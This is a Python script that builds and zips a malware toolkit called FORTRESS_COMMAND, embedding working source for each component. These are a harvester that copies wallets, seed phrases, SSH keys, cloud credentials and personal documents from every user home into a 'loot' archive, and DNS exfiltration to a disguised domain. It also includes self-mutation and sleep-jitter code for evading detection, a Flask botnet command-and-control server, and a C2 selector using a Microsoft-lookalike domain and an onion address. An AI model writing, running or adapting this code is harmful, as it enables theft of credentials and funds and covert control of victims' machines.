import os
import shutil
import zipfile

PROJECT_NAME = "FORTRESS_COMMAND"
FOLDERS = [
    "🛡️_DEFENSE",
    "👻_OFFENSE",
    "🛰️_CONTROL",
    "🧹_UTILS"
]

FILES = {
    "README.md": "# PROJECT: 1000% FORTRESS & GHOST SUITE\nStatus: Operational",
    "MISSION_BRIEF.md": "# MISSION BRIEFING\nObjective: ",
    "requirements.txt": """flask
requests
bitcoinlib
web3
xrpl-py
tonpy
solana
""",
    "ignite_system.py": '''
import os
PROJECT_NAME = "FORTRESS_COMMAND"
FOLDERS = ["🛡️_DEFENSE", "👻_OFFENSE", "🛰️_CONTROL", "🧹_UTILS"]
FILES = {
    "README.md": "# PROJECT: 1000% FORTRESS & GHOST SUITE\\nStatus: Operational",
    "MISSION_BRIEF.md": "# MISSION BRIEFING\\nObjective: ",
    "🛡️_DEFENSE/fortress_main.py": "# The Brain of the Fortress",
    "🛡️_DEFENSE/tarpit.py": "# Network Layer Trap",
    "👻_OFFENSE/ghost_shell.py": "# The Ghost C2 Shell",
    "🧹_UTILS/clean_sweep.py": "# The Self-Destruct Protocol"
}
def ignite_system():
    if not os.path.exists(PROJECT_NAME):
        os.makedirs(PROJECT_NAME)
    for folder in FOLDERS:
        path = os.path.join(PROJECT_NAME, folder)
        if not os.path.exists(path):
            os.makedirs(path)
    for filename, content in FILES.items():
        path = os.path.join(PROJECT_NAME, filename)
        dirname = os.path.dirname(path)
        if not os.path.exists(dirname):
            os.makedirs(dirname)
        if not os.path.exists(path):
            with open(path, "w", encoding="utf-8") as f:
                f.write(content)
if __name__ == "__main__":
    ignite_system()
''',
    "universal_harvester.py": '''\
import os
import re
import zipfile
import shutil
from pathlib import Path

def enumerate_user_dirs():
    homes = []
    try:
        base = Path("/Users") if os.name == "posix" else Path("C:/Users")
        for u in base.iterdir():
            if u.is_dir():
                homes.append(str(u))
    except Exception:
        homes = [str(Path.home())]
    return list(set(homes))

USER_DIRS = enumerate_user_dirs()

PATTERNS = {
    'crypto': [
        r'wallet\\.dat', r'keystore', r'UTC--.*', r'\\b(0x)?[a-fA-F0-9]{64,66}\\b', r'\\b([a-z]+ ){11,23}[a-z]+\\b'
    ],
    'credentials': [
        r'id_rsa', r'aws', r'gcloud', r'azure', r'credentials', r'secret', r'passwd', r'vpn', r'ovpn',
        r'.pfx', r'.pem', r'.ppk', r'.kdbx', r'login', r'access'
    ],
    'documents': [
        r'.*confidential.*', r'.*tax.*', r'.*finance.*', r'.*insurance.*', r'.*contract.*', r'.*nda.*',
        r'.*register.*', r'.*project.*', r'.*presentation.*(.pptx|.ppt)?', r'.*202[0-9].*', r'.*doctor.*',
        r'.*medical.*', r'.*blueprint.*'
    ],
    'code': [
        r'.*\\.py$', r'.*\\.js$', r'.*\\.go$', r'.*\\.java$', r'.*\\.c$', r'.*\\.cpp$', r'.*\\.rb$', r'.*\\.sh$',
        r'.*\\.ps1$', r'.*\\.bat$', r'\\.env$', r'docker-compose', r'Makefile', r'\\.git$'
    ],
}

LOOT_DIR = "loot"
MANIFEST = "harvest_manifest.txt"
MAX_SIZE = 10 * 1024 * 1024

def is_match(patterns, filename):
    for pat in patterns:
        try:
            if re.search(pat, filename, re.IGNORECASE):
                return True
        except Exception:
            continue
    return False

def harvest():
    findings = []
    harvested = []
    loot_path = Path(LOOT_DIR)
    loot_path.mkdir(exist_ok=True)
    for base_dir in USER_DIRS:
        for root, _, files in os.walk(base_dir):
            for file in files:
                f_path = os.path.join(root, file)
                rel_path = os.path.relpath(f_path, base_dir)
                label = None
                for category, patterns in PATTERNS.items():
                    if is_match(patterns, file) or is_match(patterns, rel_path):
                        label = category
                        break
                if label:
                    try:
                        size = os.path.getsize(f_path)
                    except Exception:
                        continue
                    findings.append(f"[{label}] {f_path} ({round(size/1024,2)} KB)")
                    if size < MAX_SIZE:
                        loot_subpath = loot_path / label / rel_path
                        loot_subpath.parent.mkdir(parents=True, exist_ok=True)
                        try:
                            shutil.copy2(f_path, loot_subpath)
                            harvested.append(str(loot_subpath))
                        except Exception:
                            continue
    with open(MANIFEST, "w") as mf:
        mf.write("\\n".join(findings))
    loot_zip = LOOT_DIR + ".zip"
    with zipfile.ZipFile(loot_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for f in harvested:
            arc = os.path.relpath(f, LOOT_DIR)
            zipf.write(f, arc)
    print(f"[√] Harvest complete! {len(findings)} items listed in {MANIFEST}, loot archived in {loot_zip}.")

if __name__ == "__main__":
    harvest()
''',
    "phantom_dns_exfil.py": '''\
import socket
import base64

def phantom_dns_exfil(data, domain="internal-update.com"):
    """
    Covertly exfiltrates data over DNS by encoding and sending as subdomain chunks.
    """
    encoded_data = base64.b32encode(data.encode()).decode().replace("=", "")
    chunks = [encoded_data[i:i+60] for i in range(0, len(encoded_data), 60)]
    for chunk in chunks:
        query = f"{chunk}.{domain}"
        print(f"[*] Sending stealth DNS packet: {query}")
        try:
            socket.gethostbyname(query)
        except Exception:
            pass

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python phantom_dns_exfil.py 'YourSecretData' [domain.com]")
        sys.exit(1)
    data = sys.argv[1]
    domain = sys.argv[2] if len(sys.argv) > 2 else "internal-update.com"
    phantom_dns_exfil(data, domain)
''',
    "polymorphic_sleep.py": '''\
import time
import random

def polymorphic_sleep(base_seconds):
    """
    Sleeps for a random duration with ±40% jitter to evade pattern-based detection systems.
    """
    jitter = random.uniform(0.6, 1.4)
    sleep_time = base_seconds * jitter
    print(f"[!] Sleeping for {sleep_time:.2f}s to avoid AI pattern detection...")
    time.sleep(sleep_time)

if __name__ == "__main__":
    import sys
    base = float(sys.argv[1]) if len(sys.argv) > 1 else 60
    print("[*] Demo: Polymorphic sleep with base of", base, "seconds.")
    polymorphic_sleep(base)
''',
    "polymorphic_mutate.py": '''\
import os
import random
import shutil
import string

def polymorphic_mutate():
    """
    Mutates the running bot to evade hash/signature-based detection.
    """
    new_name = "".join(random.choices(string.ascii_lowercase, k=8)) + ".exe"
    try:
        with open(__file__, "ab") as f:
            f.write(os.urandom(random.randint(100, 1000)))
        print("[*] Junk data appended to alter signature.")
    except Exception as e:
        print(f"[!] Could not append data: {e}")

    try:
        current_path = os.path.abspath(__file__)
        new_path = os.path.join(os.path.dirname(current_path), new_name)
        shutil.copy2(current_path, new_path)
        print(f"[*] Mutated Identity: {new_name}")
    except Exception as e:
        print(f"[!] Renaming failed: {e}")

if __name__ == "__main__":
    polymorphic_mutate()
''',
    "fetch_top_coins.py": '''\
import requests
import json

NUM_COINS = 100
REGISTRY_OUTFILE = "coin_registry.json"

EVM_CHAINS = {
    'ethereum': {'type': 'evm', 'rpc_url': "https://mainnet.infura.io/v3/YOUR_INFURA_API_KEY"},
    'binance-smart-chain': {'type': 'evm', 'rpc_url': "https://bsc-dataseed.binance.org/"},
    'polygon-pos': {'type': 'evm', 'rpc_url': "https://polygon-rpc.com/"},
    'avalanche': {'type': 'evm', 'rpc_url': "https://api.avax.network/ext/bc/C/rpc"}
}
UTXO_COINS = {
    'bitcoin': {'type': 'utxo', 'network': 'bitcoin'},
    'litecoin': {'type': 'utxo', 'network': 'litecoin'},
    'dogecoin': {'type': 'utxo', 'network': 'dogecoin'},
    'bitcoin-cash': {'type': 'utxo', 'network': 'bitcoincash'}
}
SDK_HOOKS = {
    'xrp': {'type': 'sdk', 'module': 'crypto_transfer_xrp', 'function': 'send_xrp'},
    'solana': {'type': 'sdk', 'module': 'crypto_transfer_solana', 'function': 'send_solana'},
    'ton': {'type': 'sdk', 'module': 'crypto_transfer_ton', 'function': 'send_ton'},
    'cardano': {'type': 'sdk', 'module': 'crypto_transfer_ada', 'function': 'send_ada'},
    'tron': {'type': 'sdk', 'module': 'crypto_transfer_tron', 'function': 'send_tron'},
    'polkadot': {'type': 'sdk', 'module': 'crypto_transfer_dot', 'function': 'send_dot'}
}

def main():
    print(f"[*] Fetching top {NUM_COINS} coins by market cap from CoinGecko...")
    url = f"https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page={NUM_COINS}&page=1&sparkline=false"
    coins = requests.get(url).json()
    registry = []
    for c in coins:
        entry = {"name": c['name'], "symbol": c['symbol'].upper()}
        coin_id = c['id']
        if coin_id in UTXO_COINS:
            entry.update(UTXO_COINS[coin_id])
        elif coin_id in EVM_CHAINS:
            entry.update(EVM_CHAINS[coin_id])
        elif coin_id in SDK_HOOKS:
            entry.update(SDK_HOOKS[coin_id])
        elif 'platforms' in c and c['platforms'].get('ethereum'):
            entry.update(EVM_CHAINS['ethereum'])
            entry['contract'] = c['platforms']['ethereum']
            entry['decimals'] = 18
        else:
            entry['type'] = 'unknown'
        registry.append(entry)

    unknowns = [e for e in registry if e['type'] == 'unknown']
    if unknowns:
        print(f"\\n[!] {len(unknowns)} coins not mapped to a type. Review these manually:")
        for u in unknowns:
            print(f" - {u['name']} ({u['symbol']})")

    with open(REGISTRY_OUTFILE, 'w') as f:
        json.dump(registry, f, indent=4)
    print(f"[√] Coin registry saved to {REGISTRY_OUTFILE}.")

if __name__ == '__main__':
    main()
''',
    "coin_registry.json": '''[
    {"name": "Bitcoin",   "symbol": "BTC",  "type": "utxo", "network": "bitcoin"},
    {"name": "Ethereum",  "symbol": "ETH",  "type": "evm",  "rpc_url": "https://mainnet.infura.io/v3/YOUR_INFURA_API_KEY"},
    {"name": "Tether",    "symbol": "USDT", "type": "evm",  "rpc_url": "https://mainnet.infura.io/v3/YOUR_INFURA_API_KEY", "contract": "0xdAC17F958D2ee523a2206206994597C13D831ec7", "decimals": 6},
    {"name": "BNB",       "symbol": "BNB",  "type": "evm",  "rpc_url": "https://bsc-dataseed.binance.org/" },
    {"name": "Solana",    "symbol": "SOL",  "type": "sdk",  "module": "crypto_transfer_solana", "function": "send_solana"},
    {"name": "XRP",       "symbol": "XRP",  "type": "sdk",  "module": "crypto_transfer_xrp",    "function": "send_xrp"},
    {"name": "USDC",      "symbol": "USDC", "type": "evm",  "rpc_url": "https://mainnet.infura.io/v3/YOUR_INFURA_API_KEY", "contract": "0xA0b86991C6218b36c1d19D4a2e9Eb0cE3606eB48", "decimals": 6},
    {"name": "Staked Ether", "symbol": "stETH", "type": "evm", "rpc_url": "https://mainnet.infura.io/v3/YOUR_INFURA_API_KEY", "contract": "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84", "decimals": 18},
    {"name": "Cardano",   "symbol": "ADA",  "type": "sdk",  "module": "crypto_transfer_ada",    "function": "send_ada"},
    {"name": "Dogecoin",  "symbol": "DOGE", "type": "utxo", "network": "dogecoin"},
    {"name": "TRON",      "symbol": "TRX",  "type": "sdk",  "module": "crypto_transfer_tron",    "function": "send_tron"},
    {"name": "Toncoin",   "symbol": "TON",  "type": "sdk",  "module": "crypto_transfer_ton",     "function": "send_ton"},
    {"name": "Chainlink", "symbol": "LINK", "type": "evm",  "rpc_url": "https://mainnet.infura.io/v3/YOUR_INFURA_API_KEY", "contract": "0x514910771AF9Ca656af840dff83E8264EcF986CA", "decimals": 18},
    {"name": "Polygon",   "symbol": "MATIC","type": "evm",  "rpc_url": "https://polygon-rpc.com/"},
    {"name": "Polkadot",  "symbol": "DOT",  "type": "sdk",  "module": "crypto_transfer_dot",     "function": "send_dot"},
    {"name": "Litecoin",  "symbol": "LTC",  "type": "utxo", "network": "litecoin"},
    {"name": "Wrapped Bitcoin", "symbol": "WBTC", "type": "evm", "rpc_url": "https://mainnet.infura.io/v3/YOUR_INFURA_API_KEY", "contract": "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", "decimals": 8},
    {"name": "Bitcoin Cash",    "symbol": "BCH",  "type": "utxo", "network": "bitcoincash"},
    {"name": "Dai",       "symbol": "DAI",  "type": "evm", "rpc_url": "https://mainnet.infura.io/v3/YOUR_INFURA_API_KEY", "contract": "0x6B175474E89094C44Da98b954EedeAC495271d0F", "decimals": 18},
    {"name": "Shiba Inu", "symbol": "SHIB", "type": "evm", "rpc_url": "https://mainnet.infura.io/v3/YOUR_INFURA_API_KEY", "contract": "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", "decimals": 18},
    {"name": "Avalanche", "symbol": "AVAX", "type": "evm", "rpc_url": "https://api.avax.network/ext/bc/C/rpc"}
]''',
    "🛰️_CONTROL/ghost_network_server.py": '''\
from flask import Flask, request, jsonify
import sqlite3
from datetime import datetime

app = Flask(__name__)

def init_db():
    conn = sqlite3.connect('ghost_network.db')
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS bots (
            id TEXT PRIMARY KEY,
            last_seen TEXT,
            ip TEXT,
            status TEXT,
            pending_cmd TEXT
        )
    """)
    conn.commit()
    conn.close()

@app.route('/beacon/<bot_id>', methods=['POST'])
def bot_beacon(bot_id):
    bot_ip = request.remote_addr
    data = request.json

    conn = sqlite3.connect('ghost_network.db')
    c = conn.cursor()
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c.execute(
        "INSERT OR REPLACE INTO bots (id, last_seen, ip, status, pending_cmd) "
        "VALUES (?, ?, ?, ?, (SELECT pending_cmd FROM bots WHERE id=?))",
        (bot_id, now, bot_ip, "Online", bot_id)
    )
    c.execute("SELECT pending_cmd FROM bots WHERE id=?", (bot_id,))
    row = c.fetchone()
    command = row[0] if row and row[0] else None
    if command:
        c.execute("UPDATE bots SET pending_cmd = NULL WHERE id=?", (bot_id,))
    conn.commit()
    conn.close()
    return jsonify({"command": command if command else "sleep"})

@app.route('/operator/view', methods=['GET'])
def view_bots():
    conn = sqlite3.connect('ghost_network.db')
    c = conn.cursor()
    c.execute("SELECT * FROM bots")
    all_bots = c.fetchall()
    conn.close()
    bots_data = [
        {"id": row[0], "last_seen": row[1], "ip": row[2], "status": row[3], "pending_cmd": row[4]}
        for row in all_bots
    ]
    return jsonify({"bots": bots_data})

if __name__ == "__main__":
    init_db()
    app.run(port=80, host='0.0.0.0')
''',
    "🛰️_CONTROL/ghost_c2_selector.py": '''\
import requests

C2_NODES = [
    "updates.microsoft-security-cdn.com",
    "91.205.xx.xx",
    "ghost-backup.onion"
]

def get_active_c2():
    for node in C2_NODES:
        try:
            response = requests.get(f"https://{node}/health", timeout=5)
            if response.status_code == 200:
                print(f"[C2] Active node selected: {node}")
                return node
        except Exception:
            continue
    print("[C2] No available C2 nodes found!")
    return None

if __name__ == "__main__":
    active_c2 = get_active_c2()
    print("Active C2 node:", active_c2 if active_c2 else "None")
''',
    "🛡️_DEFENSE/fortress_main.py": "# The Brain of the Fortress",
    "🛡️_DEFENSE/tarpit.py": "# Network Layer Trap",
    "👻_OFFENSE/ghost_shell.py": "# The Ghost C2 Shell",
    "🧹_UTILS/clean_sweep.py": "# The Self-Destruct Protocol"
}

def make_project():
    if os.path.exists(PROJECT_NAME):
        shutil.rmtree(PROJECT_NAME)
    os.makedirs(PROJECT_NAME)
    for folder in FOLDERS:
        path = os.path.join(PROJECT_NAME, folder)
        os.makedirs(path, exist_ok=True)
    for relpath, content in FILES.items():
        full = os.path.join(PROJECT_NAME, relpath)
        dirname = os.path.dirname(full)
        if not os.path.exists(dirname):
            os.makedirs(dirname)
        with open(full, "w", encoding="utf-8") as f:
            f.write(content if isinstance(content, str) else "")

def zip_project():
    zf = zipfile.ZipFile(f"{PROJECT_NAME}.zip", 'w', zipfile.ZIP_DEFLATED)
    for root, dirs, files in os.walk(PROJECT_NAME):
        for file in files:
            fpath = os.path.join(root, file)
            arcpath = os.path.relpath(fpath, PROJECT_NAME)
            zf.write(fpath, os.path.join(PROJECT_NAME, arcpath))
    zf.close()
    print(f"[+] Project zipped as {PROJECT_NAME}.zip")

if __name__ == "__main__":
    make_project()
    zip_project()
    print("[!] FORTRESS_COMMAND scaffolding built and zipped. Ready for GitHub upload!\\n")
    print(f"[>] To upload, unzip {PROJECT_NAME}.zip and run:")
    print("    git init && git add . && git commit -m \"initial fortress suite\" && git remote add origin <your-github-url> && git push -u origin main")